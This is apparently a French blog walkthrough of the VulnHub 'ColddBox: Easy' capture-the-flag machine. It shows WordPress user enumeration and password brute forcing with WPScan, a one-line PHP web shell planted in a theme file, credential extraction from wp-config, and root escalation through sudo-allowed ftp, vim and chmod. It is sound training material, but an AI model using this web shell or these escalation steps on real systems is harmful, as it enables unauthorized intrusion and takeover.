# Solution du CTF ColddBox: Easy de VulnHub

[ColddBox: Easy](https://vulnhub.com/entry/colddbox-easy,586/) est comme son nom l'indique un CTF très facile. Il peut toutefois permettre aux débutants de s'initier à différents outils.

Le scan `Nmap` retourne un SSH et un serveur Apache :

```
Nmap scan report for 192.168.56.109
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ebf98c09bc536808c96e8969565973b (RSA)
|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)
|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)
```

Sur le site se trouve un vieux Wordpress. J'ai directement dégainé `WPscan` :

```bash
docker run -it --rm wpscanteam/wpscan --url http://192.168.56.109/  -e ap,at,u
```

Le scanner ne trouve aucun plugin mais il y a différents utilisateurs enregistrés :

```
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

On va bruteforcer les comptes avec l'aide de la wordlist `rockyou`. Je monte mon dossier `/tmp` à l'emplacement `/data` de la VM pour que `WPscan` voit les fichiers :

```bash
docker run -v /tmp/:/data/ -it --rm wpscanteam/wpscan --url http://192.168.56.109/ -U /data/users.txt -P /data/rockyou.txt
```

Ca ne met pas beaucoup de temps avant qu'un compte soit cassé :

```
[SUCCESS] - c0ldd / 9876543210
```

Heureusement le compte est administrateur, on peut donc arrêter le bruteforce ici et se connecter.

La méthode classique est alors d'utiliser l'éditeur de thèmes pour ajouter du code dans un des fichiers PHP du site. J'ai une préférence pour le fichier `404.php` du template. J'y place le code suivant :

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
die(); 
```

Evidemment on évitera de mettre un `die()` dans un scénario plus réaliste.

Je peux alors exécuter des commandes via par exemple `/wp-content/themes/twentyfifteen/404.php?cmd=id`

Mais je ne garde le webshell que le temps de passer à reverse-ssh. Après ça je peux fouiller plus à mon aise. Première étape : voir les identifiants pour le MySQL dans le config du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Pas besoin d'aller plus loin, le mot de passe mentionner permet de passer `c0ldd` via la commande `su`.

```shellsession
c0ldd@ColddBox-Easy:~$ cat user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

Il ne faut pas longtemps avant de trouver l'étape suivante :

```shellsession
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Tous ces exécutables permettent d'obtenir un shell s'ils sont lancés avec les droits root.

Exemple avec `ftp` :

```shellsession
c0ldd@ColddBox-Easy:~$ sudo /usr/bin/ftp
ftp> !id
uid=0(root) gid=0(root) grupos=0(root)
ftp> !bash
root@ColddBox-Easy:~# cd /root
root@ColddBox-Easy:/root# ls
root.txt
root@ColddBox-Easy:/root# cat root.txt 
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

Pour `Vim` on peut bien sûr éditer des fichiers (`/etc/passwd`, `/etc/crontab`, `/etc/sudoers,` etc) pour ajouter un utilisateur privilégié, s'accorder d'autres permissions, etc mais le plus simple est d'invoquer directement un shell depuis l'éditeur :

`:!/bin/sh`

Et pour `chmod` on peut simplement mettre le bit setuid sur `/bin/dash` :

```shellsession
c0ldd@ColddBox-Easy:~$ sudo /bin/chmod 4755 /bin/dash
c0ldd@ColddBox-Easy:~$ dash -p
# id
uid=1000(c0ldd) gid=1000(c0ldd) euid=0(root) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

*Publié le 18 février 2023*
